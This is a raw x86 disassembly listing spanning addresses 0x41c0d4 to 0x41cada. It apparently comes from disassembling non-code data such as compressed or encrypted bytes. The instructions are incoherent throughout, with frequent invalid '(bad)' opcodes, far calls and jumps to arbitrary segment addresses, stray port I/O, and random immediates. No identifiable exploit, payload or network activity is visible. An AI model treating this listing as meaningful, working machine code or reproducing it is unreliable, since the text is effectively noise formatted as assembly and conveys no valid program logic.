  41c0d4:	xchg   ebx,eax
  41c0d5:	mov    DWORD PTR [ebx-0x6bf6549e],esi
  41c0db:	pop    edx
  41c0dc:	dec    esi
  41c0dd:	(bad)
  41c0e0:	imul   ebx,DWORD PTR [esi],0x62efc434
  41c0e6:	and    edi,esp
  41c0e8:	lahf   
  41c0e9:	xor    BYTE PTR [esi-0x104b997],cl
  41c0ef:	cwde   
  41c0f0:	mov    al,ds:0x748cfed1
  41c0f5:	inc    eax
  41c0f6:	mov    ebx,0x29395d2c
  41c0fb:	push   cs
  41c0fc:	pop    edi
  41c0fd:	dec    eax
  41c0fe:	xor    al,0x27
  41c100:	or     eax,DWORD PTR [esi+0x30]
  41c103:	xor    BYTE PTR [edx+eax*1+0x73],ch
  41c107:	add    DWORD PTR [eax+0x2897a362],ebp
  41c10d:	js     0x41c0a7
  41c10f:	add    al,BYTE PTR [eax]
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x5be90501,0x5
  41c182:	and    ebx,DWORD PTR [ecx]
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	or     al,0x96
  41c18e:	inc    edi
  41c18f:	lods   eax,DWORD PTR ds:[esi]
  41c190:	call   0xec2a:0x90e6417f
  41c197:	or     al,0xd0
  41c199:	aas    
  41c19a:	push   0x4ca99a90
  41c19f:	ins    DWORD PTR es:[edi],dx
  41c1a0:	ss cmc 
  41c1a2:	inc    edi
  41c1a3:	mov    ch,0x49
  41c1a5:	inc    edx
  41c1a6:	jno    0x41c1d6
  41c1a8:	pop    esi
  41c1a9:	add    al,0x96
  41c1ab:	xchg   edx,eax
  41c1ac:	cmp    esi,DWORD PTR [ebx-0x8]
  41c1af:	idiv   DWORD PTR [eax-0x760b87a8]
  41c1b5:	and    dh,BYTE PTR [edx]
  41c1b7:	icebp  
  41c1b8:	pop    ecx
  41c1b9:	inc    esi
  41c1ba:	das    
  41c1bb:	aas    
  41c1bc:	mov    ch,0xd5
  41c1be:	add    bl,BYTE PTR [esi+0x6428edc]
  41c1c4:	mov    DWORD PTR [esi],ebp
  41c1c6:	rol    BYTE PTR [eax-0x3966e94a],1
  41c1cc:	add    edx,ecx
  41c1ce:	into   
  41c1cf:	stos   BYTE PTR es:[edi],al
  41c1d0:	add    BYTE PTR [ebx],0xbc
  41c1d3:	sub    eax,DWORD PTR [edx]
  41c1d5:	mov    ebx,0xdb0d7d54
  41c1da:	mov    bh,0x92
  41c1dc:	(bad)  
  41c1dd:	dec    ebp
  41c1de:	sub    al,cl
  41c1e0:	dec    al
  41c1e2:	leave  
  41c1e3:	pop    ecx
  41c1e4:	test   BYTE PTR ds:0xe21edefa,ah
  41c1ea:	mov    DWORD PTR [edi+ebx*1],edi
  41c1ed:	jo     0x41c1f9
  41c1ef:	sub    BYTE PTR [ecx],al
  41c1f1:	retf   0x67e
  41c1f4:	inc    edi
  41c1f5:	inc    ecx
  41c1f6:	arpl   WORD PTR [edi+eax*4],si
  41c1f9:	iret   
  41c1fa:	dec    edx
  41c1fb:	xor    edx,0x2e
  41c1fe:	stc    
  41c1ff:	cmp    BYTE PTR [ecx+0x13994677],bh
  41c205:	retf   
  41c206:	repnz pop esp
  41c208:	dec    edx
  41c209:	retf   0x5077
  41c20c:	scas   eax,DWORD PTR es:[edi]
  41c20d:	repnz inc esi
  41c20f:	aas    
  41c210:	or     DWORD PTR [esi],esp
  41c212:	xchg   esp,eax
  41c213:	cmp    DWORD PTR [esi+ecx*2+0x5ec5f576],eax
  41c21a:	sub    al,0x36
  41c21c:	sbb    eax,0x7d2d7710
  41c221:	ds jl  0x41c1c0
  41c224:	cdq    
  41c225:	sbb    al,0x79
  41c227:	aam    0x36
  41c229:	and    BYTE PTR [eax],ch
  41c22b:	fnstsw WORD PTR [ecx-0x6]
  41c22e:	xchg   esp,eax
  41c22f:	outs   dx,BYTE PTR ds:[esi]
  41c230:	daa    
  41c231:	dec    ebp
  41c232:	jle    0x41c261
  41c234:	test   BYTE PTR [edi],0xd
  41c237:	shl    al,0xbd
  41c23a:	pop    eax
  41c23b:	outs   dx,DWORD PTR ds:[esi]
  41c23c:	scas   al,BYTE PTR es:[edi]
  41c23d:	xchg   edx,eax
  41c23e:	pop    esi
  41c23f:	mov    dh,BYTE PTR [edx]
  41c241:	in     eax,0x67
  41c243:	push   eax
  41c244:	xor    eax,0xc4247909
  41c249:	jmp    0xd9fe:0xca800357
  41c250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c251:	outs   dx,BYTE PTR ds:[esi]
  41c252:	sbb    BYTE PTR [edx+0x6bfa39c6],0xe6
  41c259:	inc    esi
  41c25a:	loope  0x41c296
  41c25c:	mov    ah,0x7d
  41c25e:	or     edx,DWORD PTR ds:0xe833d890
  41c264:	pop    ebp
  41c265:	repz push ebp
  41c267:	shl    BYTE PTR [ecx-0x4b],0xba
  41c26b:	outs   dx,DWORD PTR ds:[esi]
  41c26c:	or     ebp,ebx
  41c26e:	call   0x9f5b:0x108edd21
  41c275:	loopne 0x41c240
  41c277:	aaa    
  41c278:	es out 0xec,eax
  41c27b:	push   0xffffffda
  41c27d:	lea    eax,[esi+ecx*2+0x6864199]
  41c284:	scas   al,BYTE PTR es:[edi]
  41c285:	fwait
  41c286:	dec    esi
  41c287:	mov    esp,0x72d8210f
  41c28c:	ds sahf 
  41c28e:	push   0x52
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	dec    edi
  41c301:	xor    bh,BYTE PTR [esi+0x12b3caf]
  41c307:	add    BYTE PTR [ecx+eax*1],al
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	arpl   WORD PTR [esi+eiz*8+0x46ef9dc9],dx
  41c313:	push   ecx
  41c314:	out    dx,al
  41c315:	push   eax
  41c316:	sti    
  41c317:	sti    
  41c318:	pop    es
  41c319:	pusha  
  41c31a:	pop    es
  41c31b:	dec    edx
  41c31c:	test   al,0xea
  41c31e:	(bad)  [edx+0x2850a17a]
  41c324:	mov    BYTE PTR [edx-0xd5d1785],ch
  41c32a:	pop    eax
  41c32b:	ss mov bl,0x36
  41c32e:	int    0xb5
  41c330:	or     al,0xcc
  41c332:	div    DWORD PTR [ebx+0x55]
  41c335:	add    edx,edi
  41c337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c338:	adc    ebp,DWORD PTR [ebp-0x416bd9e1]
  41c33e:	fcmovu st,st(6)
  41c340:	sbb    DWORD PTR [eax-0x5ba09df0],ebp
  41c346:	mov    bl,0xc9
  41c348:	test   BYTE PTR ds:0x8c90541c,ch
  41c34e:	pop    esp
  41c34f:	pusha  
  41c350:	inc    ecx
  41c351:	lods   eax,DWORD PTR ds:[esi]
  41c352:	(bad)  
  41c353:	sub    eax,0xfeaca30
  41c358:	mov    ds:0xe00e13a8,eax
  41c35d:	mov    ds:0x1d2cbf89,eax
  41c362:	lock cwde 
  41c364:	std    
  41c365:	cmp    eax,DWORD PTR [ecx-0x29]
  41c368:	lods   al,BYTE PTR ds:[esi]
  41c369:	rcr    BYTE PTR [ebx-0x218fcf97],1
  41c36f:	repz pusha 
  41c371:	or     eax,0xbc1d7641
  41c376:	stos   BYTE PTR es:[edi],al
  41c377:	pop    ecx
  41c378:	lea    ebx,[edi+0x3e0e9a5e]
  41c37e:	jl     0x41c39b
  41c380:	fcom   QWORD PTR ds:0xb83456bc
  41c386:	mov    al,ds:0x6f75b9b0
  41c38b:	dec    edi
  41c38c:	ins    BYTE PTR es:[edi],dx
  41c38d:	xchg   BYTE PTR [eax+0x351fcee7],dh
  41c393:	mov    al,0xfd
  41c395:	repnz inc ebp
  41c397:	or     bh,0x46
  41c39a:	ret    0xafb9
  41c39d:	jmp    0x9b269212
  41c3a2:	lods   eax,DWORD PTR ds:[esi]
  41c3a3:	clc    
  41c3a4:	add    edi,DWORD PTR [edi+edx*2]
  41c3a7:	mov    dl,BYTE PTR [edi-0x460e5de6]
  41c3ad:	sbb    ecx,DWORD PTR [ecx-0x62]
  41c3b0:	and    eax,0xaab880ea
  41c3b5:	add    al,0x16
  41c3b7:	dec    ebx
  41c3b8:	ret    
  41c3b9:	or     edi,DWORD PTR [esi-0x8cc25ff]
  41c3bf:	add    edi,DWORD PTR [edx+0x430e2563]
  41c3c5:	mov    edx,DWORD PTR [edi]
  41c3c7:	in     eax,0xf6
  41c3c9:	xchg   esp,eax
  41c3ca:	cmp    ah,BYTE PTR [edi]
  41c3cc:	das    
  41c3cd:	sbb    eax,0xc47f9186
  41c3d2:	in     al,0x6f
  41c3d4:	adc    DWORD PTR [edi+0x45],eax
  41c3d7:	xchg   esp,ecx
  41c3d9:	xor    al,0xf3
  41c3db:	adc    BYTE PTR [ebx+esi*1-0x19],ah
  41c3df:	clc    
  41c3e0:	in     eax,dx
  41c3e1:	daa    
  41c3e2:	jp     0x41c3b2
  41c3e4:	push   edx
  41c3e5:	fs loope 0x41c3b3
  41c3e8:	xor    eax,0x50a6981a
  41c3ed:	pop    eax
  41c3ee:	mov    gs,WORD PTR [ebp+ebp*4+0x7ecc3443]
  41c3f5:	test   al,0xbb
  41c3f7:	outs   dx,BYTE PTR ds:[esi]
  41c3f8:	stc    
  41c3f9:	outs   dx,BYTE PTR ds:[esi]
  41c3fa:	xor    ah,dl
  41c3fc:	sub    BYTE PTR [edx-0x2fc00c20],ah
  41c402:	scas   al,BYTE PTR es:[edi]
  41c403:	lahf   
  41c404:	mov    al,0x11
  41c406:	outs   dx,BYTE PTR ds:[esi]
  41c407:	(bad)  
  41c408:	sti    
  41c409:	pop    esi
  41c40a:	mov    ecx,0x55999203
  41c40f:	add    DWORD PTR [eax],eax
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	ss cwde 
  41c482:	arpl   WORD PTR [edi],sp
  41c484:	inc    eax
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	int    0x50
  41c48e:	cli    
  41c48f:	cs xchg ebp,eax
  41c491:	in     eax,dx
  41c492:	mov    es:0x3b3f8b87,eax
  41c498:	and    eax,0x604c1909
  41c49d:	xchg   ebx,eax
  41c49e:	jmp    0x52e9:0xab05bc24
  41c4a5:	mov    ebx,0xcca2de03
  41c4aa:	arpl   WORD PTR [edx+esi*8],cx
  41c4ad:	and    al,0x6d
  41c4af:	mov    ecx,0x3660c244
  41c4b4:	and    eax,0xe800d61e
  41c4b9:	push   ebx
  41c4ba:	inc    esp
  41c4bb:	jmp    0x41c527
  41c4bd:	clc    
  41c4be:	xor    BYTE PTR [eax],ch
  41c4c0:	mov    ah,0x88
  41c4c2:	jmp    0x41c4de
  41c4c4:	xor    BYTE PTR [ecx+0x6],dh
  41c4c7:	aam    0x1b
  41c4c9:	(bad)  
  41c4cb:	and    al,0x47
  41c4cd:	push   cs
  41c4ce:	ds call 0xc816:0x572fb6d5
  41c4d6:	aad    0x8d
  41c4d8:	aad    0xd8
  41c4da:	or     al,0xfc
  41c4dc:	or     eax,0x38a81256
  41c4e1:	mov    ds:0x73dfccb2,al
  41c4e6:	xchg   esi,eax
  41c4e7:	das    
  41c4e8:	int3   
  41c4e9:	fsubr  DWORD PTR [ebp-0xf]
  41c4ec:	iret   
  41c4ed:	xchg   edi,eax
  41c4ee:	inc    ebx
  41c4ef:	pusha  
  41c4f0:	adc    edx,DWORD PTR [ebx+0x45]
  41c4f3:	xor    BYTE PTR [ebp-0x1e],bl
  41c4f6:	xor    eax,0x8c2955d5
  41c4fb:	cld    
  41c4fc:	loope  0x41c4d5
  41c4fe:	and    al,0x4f
  41c500:	push   0x12
  41c502:	mov    edx,0x6fc6572a
  41c507:	fucomp st(2)
  41c509:	ret    
  41c50a:	mov    BYTE PTR [esi+0x2],al
  41c50d:	sbb    al,BYTE PTR [esi]
  41c50f:	mov    esp,gs
  41c511:	jge    0x41c52c
  41c513:	jle    0x41c519
  41c515:	and    dh,BYTE PTR [eax-0x1238cfbc]
  41c51b:	mov    bh,0xef
  41c51d:	(bad)  
  41c51e:	mov    dh,0x73
  41c520:	xchg   ebx,eax
  41c521:	in     al,dx
  41c522:	sbb    al,0xd7
  41c524:	mov    ch,0xca
  41c526:	std    
  41c527:	test   DWORD PTR [ebx+0x1da53145],ebx
  41c52d:	leave  
  41c52e:	xchg   ecx,eax
  41c52f:	pop    ecx
  41c530:	ficom  WORD PTR [edx-0x58a1605f]
  41c536:	xor    DWORD PTR [edx+0x1cfc801a],0x38
  41c53d:	in     eax,dx
  41c53e:	aam    0x7f
  41c540:	xchg   BYTE PTR [ecx-0x1d],bl
  41c543:	jns    0x41c560
  41c545:	mov    dh,0xf2
  41c547:	mov    fs,WORD PTR [ebp-0x3ea48e0f]
  41c54d:	add    BYTE PTR [eax+0x7801f1af],al
  41c553:	mov    ss,WORD PTR [ecx]
  41c555:	jecxz  0x41c54b
  41c557:	push   ebp
  41c558:	in     eax,dx
  41c559:	popf   
  41c55a:	or     ebp,DWORD PTR [ebp+0x16e84c1f]
  41c560:	sbb    al,0xe9
  41c562:	fiadd  WORD PTR [ecx-0x74]
  41c565:	cmp    ebx,ebp
  41c567:	and    esi,ecx
  41c569:	fs xor ch,dl
  41c56c:	adc    esp,edx
  41c56e:	lock mov edx,0x7260f57f
  41c574:	js     0x41c5b4
  41c576:	adc    edx,esi
  41c578:	(bad)  
  41c57a:	fbstp  TBYTE PTR [ebx-0x7ca25d27]
  41c580:	(bad)  
  41c581:	std    
  41c582:	bound  esi,QWORD PTR [edx]
  41c584:	push   ebx
  41c585:	jl     0x41c57f
  41c587:	mov    ch,0xc4
  41c589:	adc    BYTE PTR [ecx-0x23],al
  41c58c:	pop    es
  41c58d:	mov    bl,bl
  41c58f:	in     al,dx
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x15f04836
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	stc    
  41c60d:	mov    ds:0xdbe3d4c3,eax
  41c612:	inc    eax
  41c613:	cmp    al,0x27
  41c615:	test   BYTE PTR ds:0x93409bfb,0x92
  41c61c:	xor    eax,0x9acfb966
  41c621:	push   es
  41c622:	jmp    0xaec0:0xb13dbae1
  41c629:	mov    DWORD PTR [ebp-0x27],ebx
  41c62c:	jecxz  0x41c662
  41c62e:	cmp    ah,BYTE PTR [ebx-0x68]
  41c631:	loope  0x41c66b
  41c633:	push   0xffffffc8
  41c635:	jp     0x41c660
  41c637:	ret    
  41c638:	je     0x41c5c1
  41c63a:	inc    ecx
  41c63b:	pop    ebp
  41c63c:	pop    edx
  41c63d:	xlat   BYTE PTR ds:[ebx]
  41c63e:	xlat   BYTE PTR ds:[ebx]
  41c63f:	cmp    al,0x5b
  41c641:	jne    0x41c5d3
  41c643:	ret    
  41c644:	add    ebx,DWORD PTR [ebp-0x3e]
  41c647:	lahf   
  41c648:	dec    edx
  41c649:	xchg   esi,eax
  41c64a:	cmp    esi,DWORD PTR [esi]
  41c64c:	in     eax,dx
  41c64d:	aas    
  41c64e:	(bad)  
  41c64f:	rcl    DWORD PTR [esi],1
  41c651:	stos   BYTE PTR es:[edi],al
  41c652:	lahf   
  41c653:	lea    eax,[edi+0x312b6e10]
  41c659:	mov    edi,0x423ccc01
  41c65e:	xchg   ebx,eax
  41c65f:	or     DWORD PTR [edi+0x33],esi
  41c662:	inc    ebp
  41c663:	pusha  
  41c664:	pushf  
  41c665:	mov    cs,edx
  41c667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c668:	xchg   esi,eax
  41c669:	pop    ss
  41c66a:	(bad)  
  41c66b:	repz dec eax
  41c66d:	pop    edx
  41c66e:	mov    ds:0xe17d5f6b,eax
  41c673:	adc    BYTE PTR [ecx+0x3e1a8493],bh
  41c679:	icebp  
  41c67a:	adc    cl,dh
  41c67c:	inc    ebx
  41c67d:	and    eax,0x42c172d9
  41c682:	xchg   edx,eax
  41c683:	jmp    0x8c83:0x9144547
  41c68a:	loop   0x41c662
  41c68c:	pop    edi
  41c68d:	ss mov esi,0x728f0721
  41c693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c694:	and    edx,DWORD PTR [edi-0x2]
  41c697:	cmp    al,0xe3
  41c699:	stc    
  41c69a:	mov    bh,0x1d
  41c69c:	bound  edx,QWORD PTR [ecx+0x443ef8e]
  41c6a2:	lods   al,BYTE PTR ds:[esi]
  41c6a3:	sub    eax,0x7c3f2eff
  41c6a8:	and    ch,cl
  41c6aa:	sahf   
  41c6ab:	mov    bh,0xfe
  41c6ad:	xor    bh,BYTE PTR ds:0x52b9b6e4
  41c6b3:	or     esi,ecx
  41c6b5:	hlt    
  41c6b6:	lods   al,BYTE PTR ds:[esi]
  41c6b7:	jecxz  0x41c6ea
  41c6b9:	ins    BYTE PTR es:[edi],dx
  41c6ba:	mov    BYTE PTR [eax+0x5eef86bf],ch
  41c6c0:	mov    eax,ebx
  41c6c2:	(bad)  
  41c6c3:	fmul   DWORD PTR [edi]
  41c6c5:	shr    BYTE PTR [ecx],cl
  41c6c7:	mov    cl,0xf3
  41c6c9:	mov    BYTE PTR [edi],cl
  41c6cb:	enter  0x7d96,0x80
  41c6cf:	fisub  WORD PTR [ebx-0x6a]
  41c6d2:	test   bh,bh
  41c6d4:	mov    es,WORD PTR [edx]
  41c6d6:	lock lahf 
  41c6d8:	push   cs
  41c6d9:	bound  ecx,QWORD PTR [ebx-0x5b5069da]
  41c6df:	sub    DWORD PTR [ebp+0xcc832f8],ebx
  41c6e5:	out    dx,al
  41c6e6:	adc    al,0x5f
  41c6e8:	sbb    cl,BYTE PTR [edx+0x72118286]
  41c6ee:	out    0xe0,eax
  41c6f0:	jg     0x41c697
  41c6f2:	dec    edi
  41c6f3:	test   eax,0x65667bf8
  41c6f8:	add    DWORD PTR [edx+0x2],edi
  41c6fb:	mov    ch,0x37
  41c6fd:	xor    eax,0xf40ca2d6
  41c702:	loope  0x41c77d
  41c704:	clc    
  41c705:	std    
  41c706:	inc    ecx
  41c707:	mov    al,0xfc
  41c709:	adc    eax,DWORD PTR [ecx+0x6c4ae33e]
  41c70f:	push   ecx
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	scas   al,BYTE PTR es:[edi]
  41c781:	sahf   
  41c782:	(bad)  
  41c783:	(bad)  
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c78d:	std    
  41c78e:	pop    esi
  41c78f:	daa    
  41c790:	sub    DWORD PTR ds:[esi+0x723ec2f1],esp
  41c797:	mul    DWORD PTR [ebx]
  41c799:	jecxz  0x41c74b
  41c79b:	and    al,dh
  41c79d:	sbb    al,0x36
  41c79f:	addr16 das 
  41c7a1:	loopne 0x41c7c6
  41c7a3:	mov    al,0xb5
  41c7a5:	xchg   BYTE PTR [eax+0x3169a2ae],bl
  41c7ab:	fwait
  41c7ac:	sbb    BYTE PTR [ecx+ebx*2+0x2a],ah
  41c7b0:	push   es
  41c7b1:	sahf   
  41c7b2:	sub    BYTE PTR [edi+0x5c816878],bh
  41c7b8:	add    BYTE PTR [esi+0x68],0xcd
  41c7bc:	add    bl,BYTE PTR [ecx]
  41c7be:	je     0x41c75e
  41c7c0:	xor    BYTE PTR [esi-0x2],cl
  41c7c3:	xchg   esp,eax
  41c7c4:	mov    ebp,0xb3cf7f39
  41c7c9:	fwait
  41c7ca:	sahf   
  41c7cb:	mov    ds:0xdd9abfd7,al
  41c7d0:	mov    BYTE PTR [esi+0x43],ah
  41c7d3:	mov    ebx,0xb7212eac
  41c7d8:	or     ebx,DWORD PTR [edx]
  41c7da:	test   edi,0x4bd06e27
  41c7e0:	inc    BYTE PTR [ebp+0x45884af4]
  41c7e6:	push   ds
  41c7e7:	pop    eax
  41c7e8:	addr16 push ecx
  41c7ea:	or     DWORD PTR [edx+0x23e60636],esi
  41c7f0:	push   edi
  41c7f1:	gs sub ecx,ebx
  41c7f4:	ror    BYTE PTR [ecx-0x11eb1b12],cl
  41c7fa:	push   ss
  41c7fb:	push   0xffffff96
  41c7fd:	mov    bl,ch
  41c7ff:	xor    ebx,DWORD PTR [edi]
  41c801:	jmp    0xb71c:0x8173184b
  41c808:	or     ebp,DWORD PTR [esi+0x4827f1a9]
  41c80e:	test   eax,0x4511369
  41c813:	adc    ah,ch
  41c815:	retf   
  41c816:	dec    ecx
  41c817:	adc    DWORD PTR [edi],ebp
  41c819:	push   ecx
  41c81a:	std    
  41c81b:	imul   ecx,DWORD PTR [esi],0xdf427afd
  41c821:	jae    0x41c833
  41c823:	jbe    0x41c80e
  41c825:	pusha  
  41c826:	or     al,0x45
  41c828:	enter  0xe8b5,0xe8
  41c82c:	inc    edx
  41c82d:	jg     0x41c7e5
  41c82f:	pop    ebp
  41c830:	std    
  41c831:	pop    edi
  41c832:	out    dx,al
  41c833:	cmp    al,0x8e
  41c835:	mov    ds:0x91023f00,eax
  41c83a:	push   esi
  41c83b:	scas   al,BYTE PTR es:[edi]
  41c83c:	in     al,dx
  41c83d:	out    0xb9,eax
  41c83f:	add    BYTE PTR es:[ecx],0xfc
  41c843:	sahf   
  41c844:	test   ecx,ebp
  41c846:	out    dx,al
  41c847:	cmp    eax,0xdfcbc8cb
  41c84c:	(bad)  
  41c84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c84e:	lahf   
  41c84f:	pop    edx
  41c850:	ret    
  41c851:	mov    ds:0xaf5207b3,eax
  41c856:	push   ds
  41c857:	cdq    
  41c858:	sbb    ch,BYTE PTR [ebx+0x18]
  41c85b:	aad    0xe7
  41c85d:	mov    ebx,cs
  41c85f:	xlat   BYTE PTR ds:[ebx]
  41c860:	add    eax,0x4a7a8772
  41c865:	enter  0x882b,0x74
  41c869:	cs das 
  41c86b:	and    edx,DWORD PTR [ebx+0x3c597777]
  41c871:	in     eax,dx
  41c872:	mov    bh,0xd5
  41c874:	retf   
  41c875:	jb     0x41c8cc
  41c877:	jns    0x41c8a4
  41c879:	sub    bh,ah
  41c87b:	inc    ebp
  41c87c:	call   FWORD PTR [eax]
  41c87e:	iret   
  41c87f:	xor    al,0x9d
  41c881:	jo     0x41c893
  41c883:	jne    0x41c8f8
  41c885:	xchg   ecx,eax
  41c886:	cvtps2pi mm2,QWORD PTR ds:0x5bb0800b
  41c88d:	dec    eax
  41c88e:	retf   0x51
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	and    ch,BYTE PTR ds:0x2f4c378b
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	inc    ecx
  41c90d:	add    BYTE PTR [eax-0x4d],bh
  41c910:	push   esi
  41c911:	xchg   ecx,eax
  41c912:	in     al,dx
  41c913:	(bad)  
  41c914:	int3   
  41c915:	pop    ebx
  41c916:	inc    edx
  41c917:	in     eax,dx
  41c918:	ret    
  41c919:	sub    bh,BYTE PTR [ebp+0xc]
  41c91c:	jmp    0x19b913cb
  41c921:	adc    DWORD PTR [ecx+0x74],0xffffffb0
  41c925:	(bad)  
  41c926:	mov    ch,0x3
  41c928:	mov    fs,WORD PTR [ebx]
  41c92a:	push   ebx
  41c92b:	mov    ebp,0x806a3616
  41c930:	pushf  
  41c931:	dec    ebp
  41c932:	ja     0x41c8d8
  41c934:	fnstcw WORD PTR ds:0xab899fdb
  41c93a:	in     eax,0xf3
  41c93c:	fst    QWORD PTR [ebp-0x25e92628]
  41c942:	repz jecxz 0x41c962
  41c945:	js     0x41c93b
  41c947:	mov    ebx,0x9ba2bde5
  41c94c:	xchg   edx,eax
  41c94d:	mov    edi,0xb588594a
  41c952:	jbe    0x41c99c
  41c954:	adc    al,0x57
  41c956:	mov    edi,0x1c7a72ff
  41c95b:	dec    edi
  41c95c:	imul   ebp,DWORD PTR [ebx],0x406ede68
  41c962:	leave  
  41c963:	pop    ecx
  41c964:	(bad)  
  41c965:	push   esi
  41c966:	jge    0x41c8f7
  41c968:	push   0xffffff94
  41c96a:	sti    
  41c96b:	mov    BYTE PTR [ebx+0x4a],bh
  41c96e:	mov    ?,WORD PTR [ebp-0x61]
  41c971:	mov    esp,0xf28b1b14
  41c976:	ret    
  41c977:	cmp    al,0xba
  41c979:	pop    ecx
  41c97a:	push   0x770b726e
  41c97f:	jnp    0x41c9dc
  41c981:	cld    
  41c982:	xchg   ecx,ebx
  41c984:	mov    al,0xac
  41c986:	data16 int 0x60
  41c989:	fbstp  TBYTE PTR [edx-0xf]
  41c98c:	fnstenv [edx+ebx*1]
  41c98f:	jg     0x41c99b
  41c991:	sub    al,0xd8
  41c993:	bound  ebp,QWORD PTR [ecx-0x15]
  41c996:	bound  ecx,QWORD PTR ds:0xd709373e
  41c99c:	inc    ecx
  41c99d:	xlat   BYTE PTR ds:[ebx]
  41c99e:	push   0x72
  41c9a0:	pop    es
  41c9a1:	mov    bl,0xfd
  41c9a3:	and    bl,BYTE PTR [edx]
  41c9a5:	or     BYTE PTR [ebx],0x74
  41c9a8:	loopne 0x41c9cc
  41c9aa:	and    ebp,ebp
  41c9ac:	jge    0x41c933
  41c9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9af:	push   ebp
  41c9b0:	fs shl bh,0xfc
  41c9b4:	push   es
  41c9b5:	sub    edx,esp
  41c9b7:	pop    ss
  41c9b8:	leave  
  41c9b9:	mov    ds:0x544827f,eax
  41c9be:	xor    eax,0x45f0c57b
  41c9c3:	lods   al,BYTE PTR ds:[esi]
  41c9c4:	mov    ebx,0x1cafc25a
  41c9c9:	pusha  
  41c9ca:	mov    BYTE PTR [esi+0x3bfff697],al
  41c9d0:	bound  ebx,QWORD PTR [ebx-0x6b]
  41c9d3:	sbb    ch,BYTE PTR [ebp+0x1d]
  41c9d6:	mov    ebp,0xe0d8f883
  41c9db:	push   edi
  41c9dc:	stos   BYTE PTR es:[edi],al
  41c9dd:	ret    0x71da
  41c9e0:	cmp    dh,BYTE PTR ds:[esi+0x743190c1]
  41c9e7:	sub    eax,0x2fa015a5
  41c9ec:	loopne 0x41ca1b
  41c9ee:	xchg   esi,eax
  41c9ef:	pop    esp
  41c9f0:	xor    ebp,DWORD PTR [edx-0x4f]
  41c9f3:	add    DWORD PTR [esi+0x19],0x33dee583
  41c9fa:	(bad)  
  41c9fc:	rcr    BYTE PTR [eax],0xa
  41c9ff:	mov    cl,0xa1
  41ca01:	cld    
  41ca02:	and    bl,BYTE PTR [ebx+eax*1]
  41ca05:	xor    cl,BYTE PTR [esi]
  41ca07:	hlt    
  41ca08:	inc    ebx
  41ca09:	mov    ah,0x60
  41ca0b:	mov    ds:0x4738a5a4,eax
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	int    0x28
  41ca82:	adc    esi,DWORD PTR [ecx]
  41ca84:	push   eax
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	iret   
  41ca8d:	popa   
  41ca8e:	sbb    BYTE PTR [ebx+0x292e62c],bh
  41ca94:	out    dx,eax
  41ca95:	sbb    eax,0xa9baff56
  41ca9a:	inc    esi
  41ca9b:	lock jmp 0x41cadd
  41ca9e:	stc    
  41ca9f:	mov    ebx,0x9c05f038
  41caa4:	ss fdivr st,st(2)
  41caa7:	jg     0x41ca40
  41caa9:	add    al,0x5e
  41caab:	jnp    0x41cb18
  41caad:	or     esp,DWORD PTR [edx]
  41caaf:	jmp    0xf280:0x496c8a72
  41cab6:	rcl    ebp,1
  41cab8:	in     al,dx
  41cab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caba:	inc    esi
  41cabb:	fld    QWORD PTR ds:0x7f271fc9
  41cac1:	sub    BYTE PTR [esi-0x35],dl
  41cac4:	out    0x99,al
  41cac6:	lds    esp,FWORD PTR [esi+0x4]
  41cac9:	outs   dx,BYTE PTR ds:[esi]
  41caca:	leave  
  41cacb:	in     al,dx
  41cacc:	fadd   DWORD PTR [esi+ecx*4]
  41cacf:	add    al,0xab
  41cad1:	xchg   ebx,eax
  41cad2:	repz and esp,esi
  41cad5:	je     0x41caea
  41cad7:	nop
  41cad8:	fwait
  41cad9:	push   es
  41cada:	in     al,0x41
